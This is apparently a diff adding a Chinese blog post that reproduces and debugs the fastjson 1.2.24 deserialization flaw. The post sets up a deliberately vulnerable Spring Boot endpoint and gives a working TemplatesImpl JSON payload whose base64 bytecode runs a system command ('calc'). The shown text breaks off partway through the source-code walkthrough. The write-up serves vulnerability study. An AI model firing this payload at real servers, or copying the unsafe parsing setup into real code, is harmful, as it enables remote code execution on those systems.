@@ -1,0 +1,958 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.2.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.2.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.2.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.2.0" color="#222">
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css?v=7.2.0">
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.2.0',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":true},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    translation: {
+      copy_button: '复制',
+      copy_success: '复制成功',
+      copy_failure: '复制失败'
+    }
+  };
+</script>
+
+  <meta name="description" content="fastjosn 反序列化漏洞学习fastjson 1.2.24反序列化漏洞复现先写一个正常的使用 fastjson的web服务我们使用 springboot创建      主要是pom.xml 里面要添加fastjsonfastjson要求小于等于 1.2.24   12345&amp;lt;dependency&amp;gt;    &amp;lt;groupId&amp;gt;com.alibaba&amp;lt;/groupId">
+<meta name="keywords" content="复现 漏洞分析">
+<meta property="og:type" content="article">
+<meta property="og:title" content="复现及分析fastjson1.2.24">
+<meta property="og:url" content="http://yoursite.com/2020/12/16/复现及分析fastjson1-2-24/index.html">
+<meta property="og:site_name" content="Recar的笔记">
+<meta property="og:description" content="fastjosn 反序列化漏洞学习fastjson 1.2.24反序列化漏洞复现先写一个正常的使用 fastjson的web服务我们使用 springboot创建      主要是pom.xml 里面要添加fastjsonfastjson要求小于等于 1.2.24   12345&amp;lt;dependency&amp;gt;    &amp;lt;groupId&amp;gt;com.alibaba&amp;lt;/groupId">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://yoursite.com/2020/12/16/复现及分析fastjson1-2-24/2020-12-08-14-49-01.png">
+<meta property="og:image" content="http://yoursite.com/2020/12/16/复现及分析fastjson1-2-24/2020-12-08-14-56-58.png">
+<meta property="og:image" content="http://yoursite.com/2020/12/16/复现及分析fastjson1-2-24/2020-12-11-16-47-35.png">
+<meta property="og:image" content="http://yoursite.com/2020/12/16/复现及分析fastjson1-2-24/debug%E7%AC%AC%E4%B8%80%E4%B8%AA%E6%96%AD%E7%82%B9.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/12/16/复现及分析fastjson1-2-24/%E8%A7%A3%E6%9E%90%E4%BC%A0%E8%BF%87%E6%9D%A5%E7%9A%84json.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/12/16/复现及分析fastjson1-2-24/%E8%AF%AD%E6%B3%95%E8%A7%A3%E6%9E%90.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/12/16/复现及分析fastjson1-2-24/%E8%AF%AD%E6%B3%95%E8%A7%A3%E6%9E%90%E7%9A%84token.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/12/16/复现及分析fastjson1-2-24/JavaBeanINFO.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/12/16/复现及分析fastjson1-2-24/getDeclaredFields%E8%8E%B7%E5%8F%96%E5%88%B0%E7%9A%84%E5%B1%9E%E6%80%A7%E5%80%BC.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/12/16/复现及分析fastjson1-2-24/%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6get.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/12/16/复现及分析fastjson1-2-24/%E7%AC%A6%E5%90%88%E8%A6%81%E6%B1%82%E7%9A%84%E6%96%B9%E6%B3%95.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/12/16/复现及分析fastjson1-2-24/%E5%86%99%E5%88%B0filedinfo.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/12/16/复现及分析fastjson1-2-24/2020-12-09-17-06-26.png">
+<meta property="og:image" content="http://yoursite.com/2020/12/16/复现及分析fastjson1-2-24/nam%E4%B8%8D%E8%83%BD%E4%B8%BA%E7%A9%BA.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/12/16/复现及分析fastjson1-2-24/bytecodes%E4%B8%8D%E8%83%BD%E4%B8%BA%E7%A9%BA.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/12/16/复现及分析fastjson1-2-24/tfacroty.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/12/16/复现及分析fastjson1-2-24/%E8%BF%99%E9%87%8C%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0tfactory%E4%B8%8D%E6%98%AF%E7%A9%BA%E7%9A%84.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/12/16/复现及分析fastjson1-2-24/trfactory%E5%BA%94%E6%9C%89%E7%9A%84%E6%A0%BC%E5%BC%8F.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/12/16/复现及分析fastjson1-2-24/%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E6%9C%89getExternalEcensionsMap%E6%96%B9%E6%B3%95.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/12/16/复现及分析fastjson1-2-24/_class%5B_transletIndex%5D.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/12/16/复现及分析fastjson1-2-24/JavaBeanDeserializer%E4%B8%AD%E4%BC%9A%E6%8A%8A%E4%B8%8B%E5%88%92%E7%BA%BF%E5%8E%BB%E6%8E%89.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/12/16/复现及分析fastjson1-2-24/2020-12-08-15-06-25.png">
+<meta property="og:image" content="http://yoursite.com/2020/12/16/复现及分析fastjson1-2-24/2020-12-08-15-07-00.png">
+<meta property="og:image" content="http://yoursite.com/2020/12/16/复现及分析fastjson1-2-24/2020-12-08-15-08-16.png">
+<meta property="og:image" content="http://yoursite.com/2020/12/16/复现及分析fastjson1-2-24/2020-12-11-17-30-56.png">
+<meta property="og:image" content="http://yoursite.com/2020/12/16/复现及分析fastjson1-2-24/%E8%BF%99%E6%AC%A1%E5%8F%AF%E4%BB%A5%E8%B0%83%E7%94%A8%E7%9A%84%E6%98%AFset%E7%9A%84setautocommit.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/12/16/复现及分析fastjson1-2-24/set%E8%B0%83%E7%94%A8%E7%9A%84%E6%9D%A1%E4%BB%B6.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/12/16/复现及分析fastjson1-2-24/%E8%AE%BE%E7%BD%AEdataSourceName%E5%80%BC.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/12/16/复现及分析fastjson1-2-24/%E5%8F%8D%E5%B0%84%E8%B0%83%E7%94%A8setDataSourceNmae.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/12/16/复现及分析fastjson1-2-24/%E5%8F%8D%E5%B0%84%E8%B0%83%E7%94%A8setAutoCommit.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/12/16/复现及分析fastjson1-2-24/2020-12-14-14-34-27.png">
+<meta property="og:image" content="http://yoursite.com/2020/12/16/复现及分析fastjson1-2-24/2020-12-14-12-01-50.png">
+<meta property="og:updated_time" content="2021-06-11T10:33:06.349Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="复现及分析fastjson1.2.24">
+<meta name="twitter:description" content="fastjosn 反序列化漏洞学习fastjson 1.2.24反序列化漏洞复现先写一个正常的使用 fastjson的web服务我们使用 springboot创建      主要是pom.xml 里面要添加fastjsonfastjson要求小于等于 1.2.24   12345&amp;lt;dependency&amp;gt;    &amp;lt;groupId&amp;gt;com.alibaba&amp;lt;/groupId">
+<meta name="twitter:image" content="http://yoursite.com/2020/12/16/复现及分析fastjson1-2-24/2020-12-08-14-49-01.png">
+
+
+
+
+
+  
+  
+  <link rel="canonical" href="http://yoursite.com/2020/12/16/复现及分析fastjson1-2-24/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  
+  <title>复现及分析fastjson1.2.24 | Recar的笔记</title>
+  
+
+
+
+
+
+
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?f6Wf4b00fa957d7290583a86b0d8c2de1";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Recar的笔记</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+
+    
+    
+      
+    
+
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+</div>
+    </header>
+
+    
+  
+  
+
+  
+
+  <a href="https://github.com/Ciyfly" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewbox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a>
+
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+      
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/12/16/复现及分析fastjson1-2-24/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Recar">
+      <meta itemprop="description" content="年轻人就应该多读源码多读书">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Recar的笔记">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">复现及分析fastjson1.2.24
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+
+          
+          
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2020-12-16 16:00:28" itemprop="dateCreated datePublished" datetime="2020-12-16T16:00:28+00:00">2020-12-16</time>
+            </span>
+          
+
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2021-06-11 10:33:06" itemprop="dateModified" datetime="2021-06-11T10:33:06+00:00">2021-06-11</time>
+              </span>
+            
+          
+
+          
+
+          
+          
+
+          
+
+          
+
+          <br>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="fastjosn-反序列化漏洞学习"><a href="#fastjosn-反序列化漏洞学习" class="headerlink" title="fastjosn 反序列化漏洞学习"></a>fastjosn 反序列化漏洞学习</h1><h2 id="fastjson-1-2-24反序列化漏洞复现"><a href="#fastjson-1-2-24反序列化漏洞复现" class="headerlink" title="fastjson 1.2.24反序列化漏洞复现"></a>fastjson 1.2.24反序列化漏洞复现</h2><h2 id="先写一个正常的使用-fastjson的web服务"><a href="#先写一个正常的使用-fastjson的web服务" class="headerlink" title="先写一个正常的使用 fastjson的web服务"></a>先写一个正常的使用 fastjson的web服务</h2><p>我们使用 springboot创建  </p>
+<p><img src="/2020/12/16/复现及分析fastjson1-2-24/2020-12-08-14-49-01.png" alt="目录结构">  </p>
+<p>主要是pom.xml 里面要添加fastjson<br>fastjson要求小于等于 1.2.24  </p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.23<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="简单写个路由解析"><a href="#简单写个路由解析" class="headerlink" title="简单写个路由解析"></a>简单写个路由解析</h3><p>controller.Login.java  </p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Login</span> </span>&#123;</span><br><span class="line">    <span class="meta">@RequestMapping</span>(value = <span class="string">"/fastjson"</span>, method = RequestMethod.POST)</span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> JSONObject <span class="title">test</span><span class="params">(@RequestBody String data)</span> </span>&#123;</span><br><span class="line">        JSONObject obj = JSON.parseObject(data);</span><br><span class="line">        <span class="comment">// JSONObject obj = JSON.parseObject(data, Feature.SupportNonPublicField); // 当使用 TemplatesImpl的时候用这个</span></span><br><span class="line">        JSONObject result = <span class="keyword">new</span> JSONObject();</span><br><span class="line">        result.put(<span class="string">"code"</span>, <span class="number">200</span>);</span><br><span class="line">        result.put(<span class="string">"message"</span>, <span class="string">"success"</span>);</span><br><span class="line">        result.put(<span class="string">"data"</span>, <span class="string">"Hello "</span> + obj.get(<span class="string">"name"</span>));</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>model.User.java  </p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String id_card;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getId_card</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> id_card;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId_card</span><span class="params">(String id_card)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id_card = id_card;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>controller.Login 是一个控制器是一个路由用于解析请求<br>model.User 是一个用户类 包含一些属性用于fastjson与数据对应解析  </p>
+<h3 id="请求"><a href="#请求" class="headerlink" title="请求"></a>请求</h3><p>这里发送的数据是这样的  </p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="attr">"@type"</span>: <span class="string">"com.example.demo.model.User"</span>,</span><br><span class="line">	<span class="attr">"name"</span>: <span class="string">"Recar"</span>,</span><br><span class="line">	<span class="attr">"age"</span>: <span class="number">22</span>,</span><br><span class="line">	<span class="attr">"id_card"</span>: <span class="string">"12334567"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>@type 是用于fastjson找到数据对应的类 下面的是User的属性值  </p>
+<p><img src="/2020/12/16/复现及分析fastjson1-2-24/2020-12-08-14-56-58.png" alt="请求"></p>
+<p>我们这里可以看到成功解析了数据  </p>
+<h2 id="复现及分析"><a href="#复现及分析" class="headerlink" title="复现及分析"></a>复现及分析</h2><h3 id="基于TemplatesImpl的复现与分析"><a href="#基于TemplatesImpl的复现与分析" class="headerlink" title="基于TemplatesImpl的复现与分析"></a>基于TemplatesImpl的复现与分析</h3><p>因为poc用到了 私有属性 fastjson默认不会解析私有属性 需要开启这个  <code>Feature.SupportNonPublicField</code>  </p>
+<p><img src="/2020/12/16/复现及分析fastjson1-2-24/2020-12-11-16-47-35.png" alt="有私有属性">  </p>
+<p>payload  </p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="attr">"@type"</span>: <span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>,</span><br><span class="line">	<span class="attr">"_bytecodes"</span>: [<span class="string">"yv66vgAAADEALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQANTHBlcnNvbi9UZXN0OwEACkV4Y2VwdGlvbnMHACUBAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHACYBAApTb3VyY2VGaWxlAQAJVGVzdC5qYXZhDAAHAAgHACcMACgAKQEABGNhbGMMACoAKwEAC3BlcnNvbi9UZXN0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAADAAEABwAIAAIACQAAAEAAAgABAAAADiq3AAG4AAISA7YABFexAAAAAgAKAAAADgADAAAADwAEABAADQARAAsAAAAMAAEAAAAOAAwADQAAAA4AAAAEAAEADwABABAAEQABAAkAAABJAAAABAAAAAGxAAAAAgAKAAAABgABAAAAFQALAAAAKgAEAAAAAQAMAA0AAAAAAAEAEgATAAEAAAABABQAFQACAAAAAQAWABcAAwABABAAGAACAAkAAAA/AAAAAwAAAAGxAAAAAgAKAAAABgABAAAAGgALAAAAIAADAAAAAQAMAA0AAAAAAAEAEgATAAEAAAABABkAGgACAA4AAAAEAAEAGwABABwAAAACAB0="</span>],</span><br><span class="line">	<span class="attr">"_name"</span>: <span class="string">"a.b"</span>,</span><br><span class="line">	<span class="attr">"_tfactory"</span>: &#123;&#125;,</span><br><span class="line">	<span class="attr">"_outputProperties"</span>: &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>  </p>
+<p><code>type</code>是想要序列化类的路径<br> <code>_bytecodes</code> 最后调用getOutputProperties时会进行创建的Exploit类的class 二进制base64编码</p>
+<p>发poc后断点调试  </p>
+<p><img src="/2020/12/16/复现及分析fastjson1-2-24/debug%E7%AC%AC%E4%B8%80%E4%B8%AA%E6%96%AD%E7%82%B9.jpg" alt="第一个断点"> </p>
+<p>点击第一个下一步箭头跟进 (F8) F7那个是跟入函数 我们跟入函数  </p>
+<p><img src="/2020/12/16/复现及分析fastjson1-2-24/%E8%A7%A3%E6%9E%90%E4%BC%A0%E8%BF%87%E6%9D%A5%E7%9A%84json.jpg" alt="解析传过来的json"> </p>
+<p>可以直接快进到语法解析  </p>
+<p><img src="/2020/12/16/复现及分析fastjson1-2-24/%E8%AF%AD%E6%B3%95%E8%A7%A3%E6%9E%90.jpg" alt="语法解析"> </p>
+<p>语法解析的token<br><img src="/2020/12/16/复现及分析fastjson1-2-24/%E8%AF%AD%E6%B3%95%E8%A7%A3%E6%9E%90%E7%9A%84token.jpg" alt="语法解析的token"> </p>
+<p>JavaBeanInfo build方法<br>getDeclaredFields 获得某个类的所有声明的字段，即包括public、private和proteced，但是不包括父类的申明字段<br><img src="/2020/12/16/复现及分析fastjson1-2-24/JavaBeanINFO.jpg" alt="JavaBeanInfo build方法">  </p>
+<p>getDeclaredFields 获取到的属性值  </p>
+<p><img src="/2020/12/16/复现及分析fastjson1-2-24/getDeclaredFields%E8%8E%B7%E5%8F%96%E5%88%B0%E7%9A%84%E5%B1%9E%E6%80%A7%E5%80%BC.jpg" alt="getDeclaredFields 获取到的属性值">  </p>
+<p>程序会 创建了一个 数组存储后续将要处理的目标类的特定setter方法及特定条件的getter方法<br>调用getter条件就是如下图 </p>
+<p><img src="/2020/12/16/复现及分析fastjson1-2-24/%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6get.jpg" alt="判断是否get">  </p>
